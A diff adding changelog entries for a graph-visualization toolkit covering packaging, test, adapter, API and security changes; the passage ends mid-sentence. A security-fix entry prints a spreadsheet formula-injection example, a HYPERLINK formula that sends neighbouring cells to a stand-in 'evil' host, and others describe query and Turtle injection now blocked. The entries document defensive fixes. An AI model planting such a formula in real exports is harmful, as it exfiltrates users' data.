@@ -1,5 +1,1770 @@
 # Changelog
 
+## 1.0.0 (continued): 2026-08-16 (ESM-only publishing, e2e retargeted to the SVG renderer)
+
+- **The packages publish ESM only. The `require` condition and the cjs
+  build format are gone.** The manifests promised dual format and
+  delivered it at runtime while failing every typed CommonJS consumer:
+  each entry shipped one ESM-flavored `.d.ts`, so `require("@g3t/core")`
+  from a TypeScript `.cts` raised TS1479 even though the `.cjs` file
+  resolved. The fix was not to make typed CJS work. Publishing both
+  formats is what made the dual-package hazard reachable, and the
+  library's primary integration channel is exported zustand store
+  SINGLETONS: a dependency tree reaching a package through `import` on
+  one path and `require` on another gets two module instances and
+  therefore two stores, so one view subscribes to a store another view
+  is writing to, selection stops propagating, and nothing appears in a
+  stack trace. That is not fixable from inside the library while both
+  formats ship, and TS1479 was the only thing accidentally preventing
+  it. Removing the format removes the hazard, and takes 44% of emitted
+  runtime JS with it. Nothing in this repository required a @g3t
+  package, and the limitation was already documented for adopters. A
+  Node script using `require` must move to `import` or a dynamic
+  `import()`, and Jest in default CommonJS mode needs transform
+  configuration; every modern bundler is unaffected. An assertion in
+  the dist suite fails if a `require` condition, a `main` field, or a
+  `.cjs` file comes back.
+
+- **The e2e suite tests the renderer users actually get.** Ten of
+  twelve failures traced to one stale assumption: the MBSE shell
+  defaults to the SVG renderer and marks Cytoscape deprecated, while
+  five spec files opened the shell and waited on Cytoscape-path
+  testids that a default render never produces. Shared helpers spread
+  it, so one changed default took out drag-reroute, overlay-acceptance,
+  structural-projection and shells as identical timeouts. The specs are
+  retargeted onto the SVG view's own contract rather than pinned to the
+  deprecated renderer: drawn boxes come from `[data-ssv-node] > rect`,
+  edge geometry from `[data-ssv-edge-path]`, and the transform-only pan
+  invariant from the single `[data-ssv-scene]` transform. drag-reroute
+  was rewritten, since cy grab/drag events, element positions and zoom
+  have no SVG analogue. MR-8 and MR-9 gained a check that no dragged
+  node's edge falls back to a straight line, which is what a failure of
+  the live re-router looks like.
+
+- **Sorting is reachable and reports itself.** The table's sort handler
+  sits on a div inside the `th`, but `cursor: pointer` sat on the `th`
+  and keyed off `selectable`, which is row selection: the whole header
+  cell advertised a click that only part of it answered, and a click on
+  the cell landed on the inline column filter. The pointer cursor now
+  lives on the element that handles the click, the affordance carries a
+  `column-sort-<id>` testid, and the `th` reports `aria-sort`, which
+  was previously legible only as an icon glyph.
+
+## 1.0.0 (continued): 2026-08-15 (adapter depth contract, algorithm ingest reporting, inert layout options removed, event bus scoped, test-suite floor)
+
+- **`depth` is now honored or rejected by every adapter, never ignored.**
+  `SparqlAdapter`, `CypherAdapter` and `GremlinAdapter` already honored
+  any depth in range. `HolonicAdapter` and `RestAdapter` accepted the
+  argument and discarded it, so a host wiring an "expand 2 hops" action
+  got one hop back and no signal that the request had been narrowed.
+  Both now throw `AdapterArgumentError` with `argument: "depth"` above
+  1, before issuing any request. Neither can express a hop count
+  honestly: the holonic dataset carries no boundary or projection graph
+  to link the interiors a portal traversal would collect, so a
+  multi-hop result would be disconnected components presented as a
+  neighborhood; and how many hops a REST response covers is decided by
+  the adopter's endpoint and `mapResponse`, which the adapter cannot
+  see or parameterize. An adopter whose API does take a depth encodes
+  it in `url` or `mapResponse` and calls with 1. The `GraphAdapter`
+  contract now states the rule and names which adapters do which.
+
+- **Algorithm ingest reports what it matched.** `ingestAlgorithmResults`
+  and `ingestEdgeAlgorithmResults` returned `void`, so a results map
+  whose ids matched nothing was indistinguishable from one that matched
+  everything: the merge loop skipped every entry and the call looked
+  successful. Both now return `{ supplied, matched, unmatched }`. The
+  failure this surfaces is the recurring one, results computed against
+  full IRIs applied to a UGM keyed by local names.
+  `applyAlgorithmResult` takes an optional `onIngest` callback so the
+  report reaches callers through the documented door; it deliberately
+  stays silent when a caller-supplied ingest returns nothing, because
+  reporting a full match for an unknown outcome would recreate the bug.
+
+- **Five layout options that had not done anything since elkjs left the
+  tree are removed.** `edgeRouting`, `nodePlacement`,
+  `crossingMinimization`, `edgeNodeSpacing` and `edgeEdgeSpacing` were
+  pass-throughs into an `elk.*` string map that the g3t engine does not
+  read. Setting any of them changed the layout memo key and nothing
+  else, so a caller asking for SPLINES got orthogonal routes, paid for
+  a spurious cache miss, and read jsdoc describing ELK behavior that no
+  longer runs. Gone from the public type, from the memo key, and from
+  the emitted map; the builder no longer emits a routing or
+  edge-spacing default nobody chose. A host driving its own ELK through
+  `buildStructuralElkGraph` sets these on the returned graph's
+  `layoutOptions`, where they reach an engine that honors them. The
+  perf matrix lost five "tuning variants" in the same pass: all five
+  ran the identical code path and had been publishing run-to-run jitter
+  as tuning deltas.
+
+- **The event bus is scoped to what it does, and thirteen event types
+  that nothing ever emitted are deleted.** `node:selected`,
+  `theme:changed`, `ugm:changed` and ten others were declared, and the
+  module header claimed the stores emitted to the bus. No store ever
+  did, so a host subscribing to `node:selected` waited forever with no
+  way to tell that from a graph where nothing was selected. The eight
+  surviving `context:*` events all have an emitter and a consumer: they
+  carry menu intents from the action registry to whatever executes
+  them, because the toolkit cannot execute "focus this node" without
+  deciding a host's navigation and panel behavior. That is a command
+  bus between two toolkit pieces and NOT a fourth integration channel;
+  state observation stays with the exported stores, and the ruling is
+  recorded in ARCHITECTURE.md. The `eventBus` singleton is deprecated
+  in favor of `new G3tEventBus()`: two copies of `@g3t/core` in a tree,
+  or one path reaching it through `import` while another reaches it
+  through `require`, give the emitter and the subscriber different
+  buses and the menu goes dead silently. Both toolkit APIs already take
+  the bus as a parameter.
+
+- **The test suite has a floor under it, and a coverage number for the
+  first time.** `vitest run --coverage` reports 84.63% statements and
+  75.90% branches across 170 passing files; `pnpm run test:coverage`
+  reproduces it. `@vitest/coverage-v8` had been installed and unused.
+  `passWithNoTests` is removed, and it caught a defect immediately: an
+  empty `describe` block in the structural-to-cytoscape tests had been
+  reporting as a passing test. A `tests/component/**` include pointing
+  at a directory that has never existed is also gone. In the e2e suite,
+  16 screenshot assertions that compared against no committed baseline
+  are removed along with every `isVisible()` guard, which had been
+  turning missing UI into silent passes; assertions that can actually
+  fail replace them where the harness renders the element, and tests
+  whose element the harness never mounts are deleted rather than
+  converted into a guaranteed-red gate. `LayoutSwitcher` gained
+  `aria-pressed`: it had conveyed the active engine by background color
+  alone, which no assistive technology reads and no test can assert
+  without pinning a hex value.
+
+## 1.0.0 (continued): 2026-08-14 (parse boundary, export encoding, render-failure containment, contributor onboarding, lint scope, optional-peer isolation, release path, adapter request hygiene, security policy, cross-package name collisions, archive accuracy, perf gate inputs, adopter docs, planning tree)
+
+- **The store channel is uniform: one reset name, every state type
+  exported, read-only collections, and a `setTheme` that says when it
+  cannot honor an id.** Exported zustand stores are one of the three
+  declared host-integration channels, and they had drifted in four ways
+  no gate could see, because each store was individually reasonable.
+  Six called their reset `clear` and `useSelectionStore` called it
+  `clearSelection`, so a host wiring two stores had to remember which
+  was which; `clear()` is now the name everywhere and `clearSelection`
+  stays as a deprecated alias that delegates to it, removed no earlier
+  than the next major per the policy in RELEASE.md. Four of the seven
+  state types (`InspectorSectionState`, `OverlayState`,
+  `PositionPinState`, `StyleOverrideState`, plus `ThemeState`) were
+  unexported, so a host could subscribe to those stores but could not
+  type a selector over them without redeclaring the shape by hand and
+  then silently drifting from it; all are exported now. `SelectionState`
+  handed out `Set<string>`, which a host could call `.add()` on to
+  change the selection without going through an action, leaving
+  subscribers unnotified and the canvas showing a selection the store
+  does not have; both collections are `ReadonlySet` now, a compile-time
+  narrowing that changes nothing at runtime for anyone already using the
+  actions. It surfaced exactly one internal call site, a `TreeNodeRow`
+  prop that only ever called `.has()`. Finally, `setTheme` with an
+  unknown id did nothing and said nothing, which reads as a rendering
+  bug rather than a bad id; it now warns with the id, the known ids, and
+  the `setCustomTheme` route for a theme of your own, and still does not
+  throw, because a bad theme id must not take down a host's render. A
+  new test types the store list so that a future store added without
+  `clear()` fails to compile rather than failing a test run.
+
+- **The bundle gate was measuring publish weight and calling it what
+  consumers pull. It now measures both, separately.** Its docblock said
+  unminified dist "is what consumers actually pull through their own
+  bundlers", and the ledger had been proposing, across four budget
+  raises, that layout be extracted into a separate `@g3t/layout` package
+  to bring core back under its original envelope. Bundling real imports
+  against the built packages showed the premise was false: every package
+  declares `sideEffects: false`, so a consumer downloads what it
+  references. Importing only `UGM` costs 4.8 KB of first-party code with
+  zero layout in it (no dagre, no elk, no quadtree, no force
+  simulation), against the 164 KB the package weighs. Layout costs
+  roughly 35 KB of first-party code when referenced, 106 KB with its own
+  dependencies, and nothing at all when it is not. The extraction would
+  have moved the number without changing one adopter's page load, while
+  adding a fourth tarball and a fourth publish to a release sequence
+  that already has two unrecoverable failure windows, so **that
+  recommendation is retired** with the measurements recorded as the
+  reason. A new gate, `verify:consumer-cost`, bundles five imports an
+  adopter actually writes (bare `UGM`, `UGM` plus an adapter, the layout
+  engines, core's root barrel, and `CytoscapeCanvas`) through the same
+  rollup that emits the packages, and budgets what each one costs.
+  Third-party dependencies are external, because a 200 KB graphology
+  baseline would hide a 3 KB first-party regression. `verify:bundle`
+  stays and keeps budgeting publish weight, which catches things the
+  other cannot and catches them cheaply, and its docblock now says which
+  question it answers. The layout scenario is deliberately adjacent to
+  the bare-`UGM` one: if those two ever converge, tree-shaking has
+  broken, which is the regression the extraction was aimed at.
+
+- **BREAKING for `@g3t/core`: 15 undocumented symbols withdrawn from the
+  subpath barrels.** Once `verify:archive` made it visible that 27 of
+  the 38 supposedly-archived symbols still shipped, the maintainer
+  ruling was to withdraw the ones nothing promised and keep the ones
+  something did. Withdrawn: `defaultFetch`, `retryOnError`,
+  `requestLogger` and `RetryExhaustedError` from `@g3t/core/middleware`;
+  `resultsForShape`, `resultTargets` and `resultsForFocusNode` from
+  `@g3t/core/shacl`; `PipelineRegistry`, `createCountByProperty`,
+  `createEdgeTypeBreakdown`, `createActivityTimeline` and
+  `createCommunityBreakdown` from `@g3t/core/pipeline`;
+  `overlayFromDocument` and `ingestEdgeAlgorithmResults` from
+  `@g3t/core/algorithms`; and `checkRenderPermission` from
+  `@g3t/core/projection`. Each was named in no adopter document and used
+  nowhere in this repository. `RetryExhaustedError` left with
+  `retryOnError` rather than on its own merits: it is that middleware's
+  error type, and an error nothing reachable can throw is dead surface.
+  Every remaining channel is still complete end to end, which is why the
+  other 12 middleware, SHACL and pipeline symbols stayed:
+  `createDefaultFetch` is the documented way to get a base fetch for
+  `composeMiddleware`, the report parser and its focus-node accessors
+  remain, and the four pipeline creators the root barrel exports are
+  untouched. Thirteen symbols were kept BECAUSE documentation promises
+  them: `RestAdapter`, `GremlinAdapter`, `bearerAuth` and `apiKeyHeader`
+  appear in README.md and SECURITY.md's credentials section,
+  `parseShaclReport` in ARCHITECTURE.md and the wiring guide, and the
+  incremental-layout trio in `docs/capabilities-and-limits.md`, which
+  lists it as Shipped with its import path. Per the standing
+  archive-don't-delete ruling the modules and their tests remain in the
+  tree and keep running, importing relatively rather than through the
+  public entry, so withdrawn code cannot rot silently. Core measures
+  164.0 KB, down 4.4 KB, taking it from 100% of its budget to 97%.
+
+- **BREAKING for `@g3t/react` types: three names meant two different
+  things across `@g3t/core` and `@g3t/react`, and each now means one.**
+  None of the three was catchable by the existing gates.
+  `check-api-surface.mjs` compares name SETS per entry point, so two
+  entries exporting the same name with different meanings look correct,
+  and `check-type-reachability.mjs` only asks whether a name is
+  reachable, not whether it is the same name.
+  - `ShaclShape` was core's validator model AND a structurally
+    incompatible display-only type in `SchemaView` (core keys its
+    constraint list `properties`, the view keyed it `constraints`), so
+    an adopter who imported `ShaclShape` and built an array for
+    `ShaclShapeBrowser` got a type `SchemaView` rejected, and vice
+    versa. The view's type is now `SchemaViewShape`, the react barrels
+    re-export core's `ShaclShape`, and `SchemaView`'s `shapes` prop
+    accepts EITHER form, so no runtime value that worked before stops
+    working. Core's constraint type is a superset of what the view
+    draws, so the projection loses nothing rendered.
+  - `contrastRatio` returned `number` from `@g3t/core` and
+    `number | null` from `@g3t/react` and `@g3t/react/theme`. The
+    difference is behavioral, not cosmetic: `createTheme` depends on
+    the null, because a theme may carry an `rgba()` value that must be
+    SKIPPED rather than scored, and core's would score it. The
+    null-returning one is now `contrastRatioOrNull`, named for the
+    thing that differs, and `contrastRatio` on the react entries is
+    core's function.
+  - `OKABE_ITO` was core's unmodified Okabe-Ito palette, and
+    `palette-bridge` re-exported the canvas palette under the same
+    name. Those two DIFFER: the canvas substitutes grey for the
+    published palette's black, because a filled black node reads as a
+    hole on a light canvas. The name hid a value difference rather than
+    a spelling one. The bridge now exports it as `CANVAS_CATEGORICAL`,
+    and `packages/react/src/views/canvas/palette.ts` no longer cites
+    Okabe & Ito (2008) as though it were unmodified. Palette VALUES are
+    unchanged: whether the canvas should adopt core's black is a visual
+    decision for review, not a rename.
+
+  `packages/react/src/cross-package-names.test.ts` pins all of this at
+  the value level, including that no react entry may export `OKABE_ITO`
+  bound to the canvas palette.
+
+- **`ARCHIVE.md` said 27 symbols were gone from the API when they still
+  ship.** The 2026-07-12 "archive, don't delete" ruling removed symbols
+  from `@g3t/core`'s ROOT barrel, and the document described that as
+  "they no longer ship in dist or appear in the API". Leaving the root
+  barrel is not leaving the API: `@g3t/core` publishes thirteen
+  subpaths, and 27 of the 38 listed symbols are exported from one,
+  including every symbol in the middleware, SHACL-report,
+  pipeline-registry and incremental-layout clusters. The genuinely
+  absent set is 11. The document now carries a status and an entry-point
+  list per symbol, and a new gate, `verify:archive`, cross-references
+  every row against `api-surface.json` and fails the build when they
+  disagree in either direction. Negative-tested on five mutations,
+  including one that caught a substring-matching bug in the checker's
+  first draft: entry names nest, so a row listing only `@g3t/core/x`
+  appeared to cover `@g3t/core` too.
+
+
+- **Added the community files the repository was missing, and corrected
+  the docs that described a surface it no longer has.** New:
+  CODE_OF_CONDUCT.md, `.github/CODEOWNERS`, a pull-request template, and
+  bug-report and feature-request issue templates with a contact link
+  routing suspected vulnerabilities to the private channel instead of a
+  public issue. The CODEOWNERS blocks name one maintainer, so their
+  value is not routing but marking which paths carry a decision that
+  outlived the round it was made in: the published surface and its
+  golden file, the gates, the specs, and the standing-decision
+  documents. Separately, the Schema Dashboard was retired on 2026-07-07
+  with `MatrixView` and `SankeyView` folded into the Analytics
+  dashboard, and three places kept describing it as shipped:
+  `examples/decision-dashboards/README.md` documented it in a section of
+  its own, that package's barrel comment claimed a structure dashboard
+  it does not export, and CLAUDE.md listed it. All three now describe
+  what ships, and CLAUDE.md points at `src/demo/DemoLanding.tsx` as the
+  register to count from rather than carrying its own count, since that
+  is the number that has drifted repeatedly. CLAUDE.md also said
+  `pnpm run gates` was four steps when it runs five, which understates
+  the gate by the three Python spec scripts, and still called the
+  library v1.0.0-rc.2 after the manifests moved to 1.0.0. The README's
+  playground description was corrected the same way, including which
+  surfaces are environment-gated.
+
+- **The versioned-JSON channel has one failure convention and one error
+  hierarchy.** Seven parsers across two packages failed in four
+  mutually incompatible ways with no shared error type, so a host
+  integrating through this channel wrote a different handler per
+  document and matched on message strings to tell one failure from
+  another. Four of them also called `JSON.parse` bare and then indexed
+  the result, so malformed text escaped as a raw `SyntaxError` and the
+  literal `"null"`, which is valid JSON, escaped as a `TypeError` from
+  reading `version` off `null`. Both were failures of the declared
+  contract rather than of the caller. There is now a
+  `DocumentParseError` hierarchy in `@g3t/core`: `InvalidJsonError`
+  (keeping the `SyntaxError` as `cause`), `UnsupportedVersionError`
+  (carrying the version actually found, so a message can name it
+  instead of saying "unsupported version undefined"), and
+  `MalformedDocumentError`. Every failure carries the same `code`,
+  names its `documentKind`, and points at a `path`. All of them still
+  answer to `instanceof Error`, so nothing that catches broadly
+  changes. What was deliberately NOT unified is the return shape,
+  because forcing seven parsers into one would be breaking in exchange
+  for losing information three of them need. The rule, now written down
+  in `model/document-errors.ts` and summarized in ARCHITECTURE.md, has
+  three arms: a document that degrades element-wise returns partial
+  results plus diagnostics, since one malformed edge must not cost the
+  caller the other nine hundred; a hand-authored document returns every
+  problem at once, since handing back all five mistakes beats handing
+  back the first one five times; everything else throws, since there is
+  no half an encoding spec. `parseGraphDocument`'s failure branch gained
+  a `detail` field carrying the same typed error, so one handler now
+  covers the channel without string-matching. `ReservedChannelError`
+  extends `MalformedDocumentError` and keeps its own identity and
+  message.
+
+- **Adapter requests time out, can be cancelled, and now report what
+  the server actually said.** `fetch` has no timeout of its own and the
+  adapters added none, so an endpoint that accepted a connection and
+  then stopped answering left the returned promise pending forever:
+  every adapter call sits behind an `await`, so in a browser that is a
+  spinner that never resolves, with no error to catch and nothing in
+  the console. Requests now time out after 30 seconds by default,
+  configurable per adapter with `timeoutMs` (pass 0 to disable), and
+  `AdapterRequest` carries an optional `signal` so a host can cancel an
+  in-flight query when the user navigates away. The two cases are
+  reported apart: `AdapterTimeoutError.timedOut` separates a hung
+  endpoint, which is worth reporting, from a caller cancellation, which
+  usually is not. Separately, all four remote adapters rejected a
+  non-2xx response with a bare status (`"SPARQL query failed: 500"`)
+  after reading and discarding the body the endpoint sent, which is the
+  half that says which clause failed and at what offset. They now throw
+  `AdapterHttpError` carrying the status, the URL, and the body
+  truncated to 1000 characters, with the body in the message too since
+  logging `err.message` alone is the common case. The four call sites
+  share one helper so the shape cannot drift apart again, and the
+  Neo4j-specific error path reports every error with its code instead
+  of only the first message. `retryOnError` threw a bare
+  `new Error("Max retries exceeded")` out of an empty `catch {}`, so a
+  refused connection, a rejected token, and a timeout all produced the
+  same six words; it now throws `RetryExhaustedError` with the original
+  failure as `cause`, and it no longer retries aborts at all, since
+  retrying a cancelled request ignores an explicit instruction and
+  retrying a timeout multiplies the wait the timeout existed to bound.
+  Found while doing this: `RestAdapter`'s config types were exported
+  but the class itself was exported from nowhere, so a capability the
+  docs list as shipped had no import path. It is now reachable from
+  `@g3t/core` and `@g3t/core/adapters`.
+
+- **Added SECURITY.md, including the answer to the question adopters
+  connecting a browser to a graph store should ask first.** It states
+  the private reporting channel, what is in and out of scope for a
+  library that renders inside the host's origin with the host's
+  privileges, and which entry points are hardened against hostile input
+  versus trusted by contract. The credentials section is blunt on
+  purpose: `bearerAuth` and `apiKeyHeader` attach a credential from code
+  running in the page, so anything the bundle can read the user can
+  read, and the middleware is not a secret store. If a graph store
+  cannot issue per-user, short-lived, least-privilege credentials, the
+  browser should talk to an endpoint in the host application instead,
+  which is a one-line change since the adapters take a URL. README and
+  CONTRIBUTING point at it, and the dependency section says plainly
+  that there is no automated advisory gate in CI rather than implying
+  one exists.
+
+- **The perf suite now fails by name when its budgets file is missing
+  or malformed, instead of by ENOENT or not at all.** `prf-budgets.json`
+  is a tracked input holding frozen CI measurements, and it went missing
+  once already in a bulk move of planning records; the suite read it
+  with a bare `readFileSync`, so the CI perf job died with a raw ENOENT
+  that reads like a broken test rather than a missing input. The absent
+  case now raises a named error that says the file is tracked and should
+  be restored from git rather than recreated, keeping the ENOENT as
+  `cause`. The more dangerous case was the quiet one: a file that parses
+  but is not this shape leaves `status` undefined, which makes the
+  `status === "frozen"` test false for every key, so the job passes
+  while asserting no budget at all. Unrecognized `status` and a missing
+  `budgets` object are now failures rather than defaults, on the
+  reasoning that a perf gate enforcing nothing is worse than one that is
+  red.
+
+- **The release path can now be rehearsed, and it checks what it
+  publishes.** No tag has ever been pushed, so a first publish of three
+  packages would have been the debut run of every step in
+  `publish.yml`, and that workflow ran a strict subset of the gate: no
+  `lint`, and none of the three Python spec gates, either of which could
+  have been red at the moment of a publish that npm never lets you take
+  back. It now runs `pnpm run gates` in full, with a Python toolchain in
+  the job to support it. A `workflow_dispatch` trigger runs the entire
+  workflow, all three publishes included, against `--dry-run`; a manual
+  dispatch with the dry run turned off fails on purpose, so the
+  rehearsal cannot become an accidental release. npm has no transactions
+  and no republish, so a failure between the three sequential publishes
+  leaves a partial version triple that only a version bump can repair.
+  There is no rollback to add, so a new preflight moves every check that
+  can fail in front of the first publish: the tag and all four manifests
+  must name the same version, none of the three `package@version` pairs
+  may already exist on the registry, and the tree must be clean. A
+  registry lookup that fails to answer counts as a failure rather than
+  as permission. Each package also gained a `prepack` guard that refuses
+  to build a tarball missing a file its own manifest promises, or whose
+  `dist` is older than `src`, which closes the hollow-tarball case for
+  hand-run publishes too. `--no-git-checks` stays, and RELEASE.md now
+  says why it is not a bypass: a tag build is a detached HEAD, where
+  pnpm's branch check cannot pass on any input, and the preflight
+  replaces it with a stricter set covering version agreement and
+  registry state that pnpm never examined.
+
+- **BREAKING for `@g3t/react`: `TimelineView` moved from the root barrel
+  to `@g3t/react/timeline`, because the documented install did not
+  resolve.** `vis-timeline` and `vis-data` are declared optional in
+  `peerDependenciesMeta`, so a package manager does not install them,
+  and the README told adopters to install the required peers only.
+  `TimelineView` imports both statically, and rollup had hoisted it into
+  a chunk that the root and `./views` entries import. Module resolution
+  runs before tree-shaking, so the first line of the quick start,
+  `import { CytoscapeCanvas } from "@g3t/react"`, threw
+  `ERR_MODULE_NOT_FOUND` for `vis-timeline` for every adopter who took
+  the documented install, whether or not they used a timeline. The
+  component now has its own rollup entry and its own subpath; nothing
+  else moved, and the other seven entries resolve with no optional peer
+  present. Adopters using `TimelineView` change one import and add
+  `vis-timeline` and `vis-data` to their manifest. A new gate,
+  `verify:peers`, walks the emitted import graph out of every declared
+  subpath and fails the build if an optional peer becomes reachable from
+  an entry not on its allowlist, so this cannot come back through a
+  barrel edit or a chunking change. `verify:typeref` was widened in the
+  same round: it walked only the package's root type entry, so moving a
+  component to a subpath silently dropped its prop types from the gate.
+  It now judges every declared type entry against its own namespace,
+  which surfaced eight pre-existing holes in `./views` and `./controls`
+  (prop types nameable only via the root barrel); those are fixed with
+  type-only re-exports, adding no runtime exports. ARCHITECTURE.md,
+  both READMEs, `docs/consuming-g3t.md`, the capability index, and
+  RELEASE.md's post-tag recipe were corrected; the recipe had also been
+  omitting `echarts`, a required peer, so it would have failed on first
+  run.
+
+- **Lint and format now cover the whole tree, and `lint:fix` fixes what
+  `lint` checks.** `lint` named five source directories, so
+  `examples/`, `scripts/`, `.storybook/` and every config file were
+  outside it; the shared `ignores` list also excluded `*.config.*`
+  wholesale, which meant even a run over those paths would have skipped
+  them. `lint:fix` named only two of the five directories `lint`
+  checked, so the autofixer could not repair a class of failures the
+  gate reported, and a contributor who ran it and got a clean exit still
+  had a red gate. Both scripts are now `eslint .` plus a matching
+  Prettier invocation, with the exclusion list living in
+  `eslint.config.js` and a new `.prettierignore` rather than in the
+  script strings, so the two cannot drift apart again. `api-surface.json`
+  and `pnpm-lock.yaml` are in the Prettier ignore list on purpose: both
+  are generated, and `verify:surface` compares the first byte for byte,
+  so reformatting it would put two gates in permanent conflict. Bringing
+  501 files into scope surfaced 16 real errors, now fixed: a ref written
+  during render in the analytics dashboard (unsafe under concurrent
+  rendering, since React may discard and replay a render) and two
+  `const`s referenced by an effect declared above them; a Storybook
+  decorator declared lowercase, so its hook calls read as a
+  rules-of-hooks violation, and typed `any`; a `useMemo(buildEntries, [])`
+  passing a named function whose dependencies the rule cannot analyse,
+  next to a non-null assertion on a `Map.get` the same expression had
+  just proved present; a `void`-typed value binding in the `style.css`
+  declaration; and a scattering of unused bindings and needless escapes.
+  Markdown stays out of Prettier's scope deliberately: the authored prose
+  in this file and under `docs/` is hand-wrapped.
+
+- **Contributor onboarding: the first hour no longer describes a
+  repository that does not exist.** CONTRIBUTING.md had no install
+  section at all, while `preinstall` runs `only-allow pnpm` and rejects
+  npm without naming corepack, and `pnpm run gates` terminates in three
+  Python scripts needing an interpreter and a `pyyaml` no document
+  mentioned. A new Setup section names all three prerequisites with the
+  versions the `engines` and `packageManager` fields pin, and points at
+  `pnpm run gates` as the single command CI runs. The rest of the file
+  was corrected against the package split: the testing matrix and Code
+  Style rules cited the pre-split `src/core/` and `src/views/`; the
+  rationale link pointed at `docs/testing-architecture.md`, which has
+  never existed (the file is `docs/source/testing-architecture.md`); the
+  PR checklist ran `test && typecheck && lint`, a strict subset of CI
+  that skips `verify` and the spec gates, and required a CHANGELOG
+  `[Unreleased]` section with zero occurrences in this file; the commit
+  format was the retired milestone ticket scheme. DEVELOPER.md's
+  structure tree, barrel-export recipe, test count and demo description
+  were rewritten from the current tree (eight lazy shells, not nine
+  scenarios with five shells and a generic fallback), the fcose
+  declaration path was corrected, and counts were dropped rather than
+  re-guessed: hand-maintained numbers here have drifted repeatedly, and
+  the gate script is the authority. `pnpm-workspace.yaml` carried the
+  literal string `set this to true or false` where `allowBuilds.canvas`
+  expects a boolean; canvas is an optional jsdom peer this repo
+  deliberately does not install, so the value is `false`.
+
+- **`@g3t/react`: a render failure no longer takes the whole page
+  down.** Two holes, one theme. `useStructuralLayout` started a
+  layout promise with no rejection handler, so an engine throw or a
+  failed dynamic-chunk import surfaced only as an
+  `unhandledrejection`; the hook kept returning `structural: null`,
+  which is indistinguishable from "still laying out", and the host
+  spun a loading state forever. It now returns
+  `{ structural, error }`, with the error keyed to the input that
+  produced it and cleared by a later successful layout. Separately,
+  the package shipped no error boundary at all (there is no hook form
+  of one), so any render-phase throw under a view unmounted the tree
+  to a blank page. `ViewErrorBoundary` is new: a `fallback` render
+  prop receiving the error and a `retry`, an `onError` callback
+  receiving React's component stack, and a built-in message-plus-retry
+  fallback styled inline so it stays legible even when the failure was
+  the stylesheet. It is a tree-shakeable named export. The demo shell
+  loader is wired through it, and holds its shells as loaders rather
+  than module-level `lazy` components, because a rejected `React.lazy`
+  caches its rejection forever and can only re-throw: retry has to
+  build a new one.
+
+- **`@g3t/core`: both export sinks encode for their consumer, not just
+  for their format.** `exportSubgraphTurtle` escaped every term through
+  `iriSafe` or `turtleLiteral` except one: `provenance_iri` was
+  stringified straight into `<...>`. That property arrives from adapter
+  responses and imported documents, so a value that closes the bracket
+  and opens its own subject wrote attacker-chosen triples into the .ttl
+  an analyst loads into a triplestore, forging lineage in the file whose
+  docstring exists to preserve it. Characters Turtle forbids in an
+  IRIREF are now percent-escaped, and a value with no scheme is dropped
+  with an in-band comment rather than emitted as a relative IRI that
+  resolves against the base into a real subject. `exportSubgraphCsv`
+  quoted for the delimiter but passed a leading `=`, `+`, `-`, `@`, tab
+  or CR through to the spreadsheet this module names as its consumer,
+  where `=HYPERLINK("https://evil/"&A2,"x")` exfiltrates neighbouring
+  cells on click. Those cells now get the standard leading apostrophe.
+  Plain numbers are exempt, so a negative measurement stays arithmetic;
+  `-1+1` is not a number and is guarded.
+
+- **`@g3t/core`: `parseGraphDocument` now checks element shape, not
+  just the document envelope.** It declared a
+  `{ error } | { document, diagnostics }` union but only guarded the
+  top level, so `{"version":1,"nodes":[{"id":"a"}],"edges":[null]}`
+  threw a raw `TypeError` out of library internals at a caller who had
+  every reason to expect the error branch, and
+  `{"nodes":[{"id":5}],"edges":[{"id":1,"source":5,"target":5}]}`
+  returned "valid" with zero diagnostics and corrupted the layout
+  stages downstream. Malformed elements are now dropped with a
+  `BAD_SHAPE` diagnostic naming the subject (`nodes[2].width`), which
+  is the degrade-and-report convention `elk-import` already used. The
+  round-trip guarantee is preserved by returning the parsed object
+  itself when nothing was dropped. A test walks
+  `GRAPH_DOCUMENT_SCHEMA` and fails if a declared field has no
+  matching check, so the schema and the checkers cannot drift apart.
+  Checkers are hand-written rather than a JSON Schema engine: an
+  engine would cost more than the whole document module against the
+  bundle budget.
+- **The wiring guide is now gated.** It carried working recipes for a
+  compartment-collapse API removed by ruling on 2026-07-10, and
+  nothing failed. Its 25 fenced snippets are now typechecked against
+  the real package types by `verify:snippets`, so a recipe naming a
+  removed or renamed export fails the build. Fixing the fallout found
+  eight snippets that used a toolkit symbol without showing its
+  import; those now show it, which also makes them copy-pastable.
+  Host-owned placeholders (`ugm`, `cy`, your settings) are declared
+  ambiently by the gate; toolkit symbols deliberately are not, since
+  that is the check. The guide's claim that it "cannot rot silently"
+  is replaced with what is actually enforced.
+- **The three remote query adapters are parameterized.** The published
+  `GraphAdapter` contract takes `nodeId`, `depth` and `edgeTypes` from
+  host state, and Gremlin, Cypher and SPARQL all spliced them straight
+  into query text, so a hostile id could close the literal it sat in
+  and append clauses of its own. The rule now: bind where the protocol
+  has a binding mechanism, validate where it does not. Gremlin moves
+  those values into the `bindings` map it was already sending empty on
+  every request. Cypher's `executeCypher` now sends a `parameters`
+  object, which is also what makes its pre-existing `$nodeId`
+  placeholders real (without it Neo4j answers "Expected parameter(s):
+  nodeId", so `expandNeighborhood` was broken against a live server).
+  SPARQL has no binding mechanism for `application/sparql-query` and
+  these positions are syntax anyway, so ids are validated as absolute
+  IRIs. New `@g3t/core/adapters` exports `AdapterArgumentError`,
+  `coerceDepth`, `assertPlainIdentifier`, `assertSafeIri` and
+  `MAX_TRAVERSAL_DEPTH`, so a host can catch a rejection and tell it
+  apart from a transport failure. Values that cannot be proven safe
+  are rejected rather than escaped: escaping would mean modeling each
+  dialect's quoting rules correctly forever. The new tests pin the
+  GENERATED QUERY TEXT, which nothing did before, so the adapters
+  cannot be rewritten to interpolate again with the suite still green.
+  `adapter.query(q)` is unchanged and still passes text through
+  verbatim, which its docblock now states.
+- **Planning documents that tracked files cite are tracked again.** A
+  commit gitignoring the planning tree left 15 records, plus three
+  `planning/g3l/` documents cited from shipped source
+  (`packages/core/src/index.ts`, `scripts/check-bundle-size.mjs`,
+  `packages/react/.../structural-edge-overlay.test.ts`), unresolvable
+  in a clone. Those are back under `planning/`. Documents nothing
+  cites stay in the untracked `planning/archive/`, and STATUS.md now
+  states that convention. Citations to documents deleted on purpose
+  (the flagship planning set, the visual-acceptance round log) now say
+  so instead of pointing at nothing; STATUS.md's stale "CURRENT FOCUS:
+  the flagship demo" section is retitled as superseded.
+- **The Pages landing page describes the product that exists.** Its
+  playground card named a "data science" and a "healthcare" shell that
+  no longer exist while omitting five that do, so the sentence matched
+  no build of the app. That list is now generated from the demo sources
